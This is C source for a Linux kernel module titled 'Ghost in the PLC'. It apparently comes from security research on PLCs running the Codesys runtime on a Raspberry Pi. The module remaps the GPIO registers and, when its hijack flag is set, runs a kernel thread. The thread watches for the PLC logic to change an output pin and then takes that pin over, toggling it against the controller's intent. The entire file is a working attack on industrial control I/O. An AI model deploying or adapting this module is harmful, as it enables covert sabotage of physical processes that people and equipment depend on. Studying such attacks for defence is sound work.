/*
 * Usage: insmod drk.ko ppid=int gpioB=pchar interval=int hijack=int
 */
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kallsyms.h>
#include <linux/pid.h>
#include <linux/sched.h>
#include <linux/delay.h>
#include <linux/kthread.h>
#include <asm/io.h>

static int ppid = 0;
static int interval = 0;
static int hijack = 0;
static char* gpioB = "0x00";
void* gpio_map;

volatile unsigned* gpio = 0x00;
struct task_struct* task;

module_param(ppid, int, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
MODULE_PARM_DESC(ppid, "Process PID");
module_param(gpioB, charp, 0000);
MODULE_PARM_DESC(gpioB, "Base address of GPIO");
module_param(interval, int, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
MODULE_PARM_DESC(interval, "Blink Interval");
module_param(hijack, int, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
MODULE_PARM_DESC(hijack, "Hijack the control"); // 1=Yes, 0=No

#define BCM2708_PERI_BASE        0x20000000
#define GPIO_BASE                (BCM2708_PERI_BASE + 0x200000) /* GPIO controller */
#define BLOCK_SIZE 4096

#define INP_GPIO(g) *(gpio+((g)/10)) &= ~(7<<(((g)%10)*3))
#define OUT_GPIO(g) *(gpio+((g)/10)) |=  (1<<(((g)%10)*3))
#define SET_GPIO_ALT(g,a) *(gpio+(((g)/10))) |= (((a)<=3?(a)+4:(a)==4?3:2)<<(((g)%10)*3))
#define GPIO_SET *(gpio+7)
#define GPIO_CLR *(gpio+10)
#define GET_GPIO(g) (*(gpio+13)&(1<<g))
#define GPIO_PULL *(gpio+37)
#define GPIO_PULLCLK0 *(gpio+38)

int blink_func(void* data) {
	int g = 22; // Pin 22 attached to LED
	int initial_state, led_state, i, repeat;
	
	while(1) {
		initial_state = GET_GPIO(g); // Read state of the LED
		led_state = initial_state;

		printk(KERN_INFO "[DR] Loop started\n");

		// Look for the time of a write operation from the logic
		while (led_state == initial_state) {
			msleep(50); // Polling granularity
			printk(KERN_INFO "[DR] Check led\n");
			if (kthread_should_stop()) return 0;
			led_state = GET_GPIO(g); // Poll the LED state
		}

		// LED changed in the last 50ms, start blinking
		printk(KERN_INFO "[DR] Led changed\n");

		repeat = 3950 / interval; // Codesys logic switches the led every 4 seconds
		for (i = 0; i < repeat; i++) {
			msleep(interval);
			if (kthread_should_stop()) return 0;
			GPIO_CLR = 1 << g; // Switch off the LED
			msleep(interval);
			if (kthread_should_stop()) return 0;
			GPIO_SET = 1 << g; // Switch on the LED
		}
	}
	return 0;
}

static int __init io_remap_module_init(void) {
	long l;					// Casted char pointer received from module_param
	char *endptr;				// End of casted char pointer

        printk(KERN_INFO "[DR] init\n");

	l = simple_strtol(gpioB, &endptr, 0);
        if (endptr == NULL) {
                printk(KERN_INFO "[DR] Failed to cast input address!\n");
		return 0;
        }

	gpio = (unsigned *)l; // GPIO base used by Codesys
	gpio_map = ioremap(GPIO_BASE, BLOCK_SIZE); // GPIO base remapped

	printk(KERN_INFO "[DR] Target process: %d\n", ppid);
        printk(KERN_INFO "[DR] Codesys GPIO Base address: %x %s %lu\n", (unsigned)gpio, gpioB, l);
	printk(KERN_INFO "[DR] Remapped GPIO Base address: %x %lu\n", (unsigned)gpio_map, (long)gpio_map);
	printk(KERN_INFO "[DR] Interval: %d\n", interval);
	printk(KERN_INFO "[DR] Hijack: %d\n", hijack);

	gpio = gpio_map; // Use new GPIO base from now on

	if (hijack == 1) {

		// Async call to the blink function
		task = kthread_run(&blink_func, NULL, "blink");
		if (IS_ERR((void*)task)) {
			printk(KERN_INFO "[DR_Handler] Creating thread... failed %ld\n", PTR_ERR((void*)task));
		}
		printk(KERN_INFO "[DR] Task created!\n");

	}

	return 0;

}

static void __exit io_remap_module_exit(void) {

	kthread_stop(task);
	iounmap(gpio_map);
        printk(KERN_INFO "[DR] exit\n");

}

module_init(io_remap_module_init);
module_exit(io_remap_module_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("cl0wn & bl4ckic3");
MODULE_DESCRIPTION("Ghost in the PLC");
